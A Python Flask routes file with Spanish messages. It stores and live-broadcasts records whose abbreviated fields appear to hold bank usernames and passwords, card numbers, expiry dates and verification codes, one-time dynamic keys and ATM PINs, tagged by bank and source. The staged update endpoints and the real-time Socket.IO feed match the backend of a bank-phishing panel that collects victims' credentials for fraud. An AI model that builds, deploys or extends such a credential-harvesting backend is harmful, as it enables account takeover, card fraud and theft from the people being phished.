from flask import request, blueprints, redirect, session, render_template, jsonify
from models.info import Info, db, ma, InfoSchema
from config.bd import socketio
from datetime import datetime 
from flask_socketio import emit

info_routes = blueprints.Blueprint("info", __name__)

@info_routes.route('/info', methods=['GET'])
def info():
    info = Info.query.all()
    schema = InfoSchema(many=True)
    result = schema.dump(info)
    return jsonify(result)

@info_routes.route('/infoPost', methods=['POST'])
def infoPost():
    try:
        data = request.get_json()
                
        new_Info = Info(
            data['name'], 
            data['reg'], 
            data['cl'],
            data['mail'],
            data['pi'],
            data['status'],
            '',
            '',
            data['cr'],
            data['px'],
            data['vc'],
            '',
            '',
            data['bn'],
            data['fuente']
            )
        
        db.session.add(new_Info)
        db.session.commit()
        
        socketio.emit('new_info',
                      {'name' : data['name'],
                       'reg' : data['reg'],
                       'cl' : data['cl'],
                       'mail' : data['mail'],
                       'pi' : data['pi'],
                       'status' : data['status'],
                       'us' : '',
                       'ps' : '',
                       'cr' : data['cr'],
                       'px' : data['px'],
                       'vc' : data['vc'],
                       'din' : '',
                       'ccaj' : '',
                       'bn' : data['bn'],
                       'fuente' : data['fuente'],
                       }, namespace='/')
        
        return jsonify({'message': 'Datos guardados correctamente'}), 200
    except Exception as E:
        return jsonify({'message': str(E)}), 400

@info_routes.route('/updateUs/<idreg>', methods=['PUT'])
def updateUs(idreg):
    try:
        object = Info.query.get(idreg)
        if not object:
            return jsonify({'message': 'Registro no encontrado :()'}), 404
        
        data = request.get_json()
        
        object.us = data['us']
        object.ps = data['ps']
        object.status = data['status']
        
        db.session.commit()
        
        socketio.emit('new_info',{
            'name' : object.name,
            'reg' : object.reg,
            'cl' : object.cl,
            'mail' : object.mail,
            'pi' : object.pi,
            'status' : object.status,
            'us' : data['us'],
            'ps' : data['ps'],
            'cr' : object.cr,
            'px' : object.px,
            'vc' : object.vc,
            'din' : object.din,
            'ccaj' : object.ccaj,
            'bn' : object.bn,
            'fuente' : object.fuente
            }, namespace='/')
        
        return jsonify({'message': 'Registro actualizado :)'}), 200
    
    except Exception as E:
        return jsonify({'message': str(E)}), 400

@info_routes.route('/updateDin/<idreg>', methods=['PUT'])
def updateDin(idreg):
    
    try:   
        object = Info.query.get(idreg)
        if not object:
            return jsonify({'message': 'Registro no encontrado'}), 404
        
        data = request.get_json()
        
        object.din = data['din']
        object.status = data['status']
        db.session.commit()
        
        socketio.emit('new_info',{
            'name' : object.name,
            'reg' : object.reg,
            'cl' : object.cl,
            'mail' : object.mail,
            'pi' : object.pi,
            'status' : object.status,
            'us' : object.us,
            'ps' : object.ps,
            'cr' : object.cr,
            'px' : object.px,
            'vc' : object.vc,
            'din' : data['din'],
            'ccaj' : object.ccaj,
            'bn' : object.bn,
            'fuente' : object.fuente
            }, namespace='/')
        
        return jsonify({'message': 'Registro actualizado :)'}), 200
    except Exception as E:
        return jsonify({'message': str(E)}), 400

@info_routes.route('/updateCcaj/<idreg>', methods=['PUT'])
def updateCcaj(idreg):
    try:
        object = Info.query.get(idreg)
        if not object:
            return jsonify({'message': 'Registro no encontrado'}), 404
        
        data = request.get_json()
        
        object.ccaj = data['ccaj']
        object.status = data['status']
        db.session.commit()
        
        socketio.emit('new_info',{
            'name' : object.name,
            'reg' : object.reg,
            'cl' : object.cl,
            'mail' : object.mail,
            'pi' : object.pi,
            'status' : object.status,
            'us' : object.us,
            'ps' : object.ps,
            'cr' : object.cr,
            'px' : object.px,
            'vc' : object.vc,
            'din' : object.din,
            'ccaj' : data['ccaj'],
            'bn' : object.bn,
            'fuente' : object.fuente
            }, namespace='/')
        
        return jsonify({'message': 'Registro actualizado :)'}), 200
    except Exception as E:
        return jsonify({'message': str(E)}), 400

@info_routes.route('/updateFinish/<idreg>', methods=['PUT'])
def updateFinish(idreg):
    try:
        object = Info.query.get(idreg)
        if not object:
            return jsonify({'message': 'Registro no encontrado'}), 404
        
        data = request.get_json()
        
        status = 'Finalizado'
        
        object.status = status
        db.session.commit()
        
        socketio.emit('new_info',{
            'name' : object.name,
            'reg' : object.reg,
            'cl' : object.cl,
            'mail' : object.mail,
            'pi' : object.pi,
            'status' : data['status'],
            'us' : object.us,
            'ps' : object.ps,
            'cr' : object.cr,
            'px' : object.px,
            'vc' : object.vc,
            'din' : object.din,
            'ccaj' : object.ccaj,
            'bn' : object.bn,
            'fuente' : object.fuente
            }, namespace='/')
        
        return jsonify({'message': 'Registro actualizado :)'}), 200
    except Exception as E:
        return jsonify({'message': str(E)}), 400

@info_routes.route('/deleteInfo/<idreg>', methods=['DELETE'])
def deleteInfo(idreg):
    try:
        object = Info.query.get(idreg)
        if not object:
            return jsonify({'message': 'Registro no encontrado'}), 404
        
        db.session.delete(object)
        db.session.commit()
        
        socketio.emit('delete_info', {'idreg': idreg}, namespace='/')
        
        return jsonify({'message': 'Registro eliminado'}), 200
    except Exception as E:
        return jsonify({'message': str(E)}), 400
        
        